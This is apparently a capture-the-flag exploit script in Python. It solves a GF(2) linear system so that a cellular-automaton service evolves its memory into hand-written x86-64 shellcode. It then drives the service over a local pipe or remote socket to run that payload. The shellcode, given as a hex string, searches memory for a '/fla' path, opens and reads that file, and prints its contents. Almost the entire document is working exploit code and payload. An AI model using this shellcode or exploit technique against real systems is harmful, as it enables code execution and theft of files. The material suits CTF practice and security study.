#!/usr/bin/env python3
import argparse, os, socket, subprocess, sys, re, struct, tempfile, time

N=32
BITS=N*N
NEIGH=[(-1,0),(1,0),(0,1),(0,-1),(-1,1),(1,-1)]

def evolve_linear_rows():
    # state cell -> bitset of seed bits affecting it, substrate omitted because affine offset handled by zero output.
    state=[1<<i for i in range(BITS)]
    for _ in range(7):
        nxt=[0]*BITS
        for r in range(N):
            base=r*N
            for c in range(N):
                v=0
                for dr,dc in NEIGH:
                    rr=r+dr; cc=c+dc
                    if 0 <= rr < N and 0 <= cc < N:
                        v ^= state[rr*N+cc]
                nxt[base+c]=v
        state=nxt
    # rows in packed fabric bit order: byte r*4+c//8, bit c&7
    rows=[0]*BITS
    for r in range(N):
        for c in range(N):
            out_bit=(r*4+(c>>3))*8 + (c&7)
            rows[out_bit]=state[r*N+c]
    return rows

ROWS=evolve_linear_rows()

def solve_gf2_known(rhs_bits, known_count):
    # Solve only the prefix equations. The fabric suffix is left unconstrained; the shellcode exits before it.
    mat=[ROWS[i] | (rhs_bits[i]<<BITS) for i in range(known_count)]
    m=len(mat)
    row=0
    piv=[]
    for col in range(BITS):
        pivot=None
        mask=1<<col
        for r in range(row, m):
            if mat[r] & mask:
                pivot=r; break
        if pivot is None:
            continue
        mat[row],mat[pivot]=mat[pivot],mat[row]
        for r in range(m):
            if r != row and (mat[r] & mask):
                mat[r] ^= mat[row]
        piv.append(col)
        row += 1
        if row == m:
            break
    coeff_mask=(1<<BITS)-1
    for r in range(row, m):
        if (mat[r] & coeff_mask)==0 and ((mat[r]>>BITS)&1):
            raise RuntimeError('linear system inconsistent for shellcode prefix')
    sol=0
    for i,col in enumerate(piv):
        if (mat[i]>>BITS)&1:
            sol |= 1<<col
    return sol, len(piv), m

def bits_from_bytes(buf):
    bits=[]
    for b in buf:
        for i in range(8):
            bits.append((b>>i)&1)
    return bits

def bytes_from_probe(vals):
    return bytes(vals)

SHELLCODE = bytes.fromhex(
    '488d1d00000000'
    '4881e300f0ffff'
    '4881eb00100000'
    '813b2f666c61'
    '7405'
    '48ffc3'
    'ebf3'
    '4889de'
    'bf9cffffff'
    '31d2'
    '4531d2'
    'b801010000'
    '0f05'
    '89c7'
    '488d3520000000'
    '31c0'
    'ba00010000'
    '0f05'
    '89c2'
    'bf01000000'
    'b801000000'
    '0f05'
    'b83c000000'
    '31ff'
    '0f05'
)
assert len(SHELLCODE) == 95
TARGET = SHELLCODE  # only this prefix is constrained; suffix may be any growable bytes

class Tube:
    def __init__(self, local=None, remote=None):
        self.p=None; self.s=None; self.buf=b''
        if local:
            env=os.environ.copy()
            # for testing, caller can pass FLAGPATH in environment
            self.p=subprocess.Popen([local], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, env=env)
        else:
            host,port=remote
            self.s=socket.create_connection((host,port), timeout=10)
            self.s.settimeout(10)
    def _recv(self, n=4096):
        if self.p:
            return self.p.stdout.read(1)  # line oriented slow but fine
        return self.s.recv(n)
    def recvline(self):
        while b'\n' not in self.buf:
            if self.p:
                ch=self.p.stdout.read(1)
                if not ch: break
                self.buf += ch
            else:
                data=self.s.recv(4096)
                if not data: break
                self.buf += data
        if b'\n' in self.buf:
            line,self.buf=self.buf.split(b'\n',1)
            return line+b'\n'
        line,self.buf=self.buf,b''
        return line
    def sendline(self, line):
        if isinstance(line,str): line=line.encode()
        line += b'\n'
        if self.p:
            self.p.stdin.write(line); self.p.stdin.flush()
        else:
            self.s.sendall(line)
    def close(self):
        try:
            if self.p: self.p.kill()
            if self.s: self.s.close()
        except Exception: pass


def drain_banner(t):
    # banner has two lines
    l1=t.recvline(); l2=t.recvline()
    return l1+l2

def expect_line(t, prefix=None):
    line=t.recvline()
    # print('DBG',line, file=sys.stderr)
    if prefix is not None and not line.startswith(prefix):
        raise RuntimeError(f'unexpected line {line!r}, wanted {prefix!r}')
    return line

def probe_zero(t):
    t.sendline('INCUBATE')
    expect_line(t, b'incubated')
    vals=[]
    for r in range(32):
        for c in (0,8,16,24):
            t.sendline(f'PROBE {r} {c}')
            line=expect_line(t, b'Tc:')
            m=re.search(rb'Tc:\s*(\d+)', line)
            if not m: raise RuntimeError(f'bad probe line {line!r}')
            vals.append(int(m.group(1)) & 0xff)
    return bytes(vals)

def main():
    ap=argparse.ArgumentParser()
    g=ap.add_mutually_exclusive_group(required=True)
    g.add_argument('--local')
    g.add_argument('--remote', nargs=2, metavar=('HOST','PORT'))
    args=ap.parse_args()
    if args.local:
        t=Tube(local=args.local)
    else:
        t=Tube(remote=(args.remote[0], int(args.remote[1])))
    try:
        sys.stderr.write(drain_banner(t).decode(errors='replace'))
        zero=probe_zero(t)
        print(f'[+] zero fabric: {zero.hex()}', file=sys.stderr)
        rhs=bytes(a^b for a,b in zip(TARGET, zero[:len(TARGET)]))
        sol,rank,eqs=solve_gf2_known(bits_from_bytes(rhs), len(TARGET)*8)
        print(f'[+] solved prefix equations={eqs}, rank={rank}, seed live cells={sol.bit_count()}', file=sys.stderr)
        for i in range(BITS):
            if (sol>>i)&1:
                r,c=divmod(i,32)
                t.sendline(f'SEED {r} {c}')
                expect_line(t, b'ok')
        t.sendline('INCUBATE')
        expect_line(t, b'incubated')
        # Optional local/remote quick verification by probing first 128 bytes could consume probe budget but allowed.
        t.sendline('FIRE')
        # collect output until EOF/timeout
        out=b''
        while True:
            try:
                line=t.recvline()
            except socket.timeout:
                break
            if not line: break
            out += line
            if b'H7CTF{' in out or b'flag{' in out or b'CTF{' in out:
                # keep a little more maybe
                pass
        print(out.decode(errors='replace'), end='')
        m=re.search(rb'([A-Za-z0-9_]+\{[^}\n]+\})', out)
        if m:
            print(f'<FLAG>{m.group(1).decode()}</FLAG>')
    finally:
        t.close()

if __name__=='__main__':
    main()
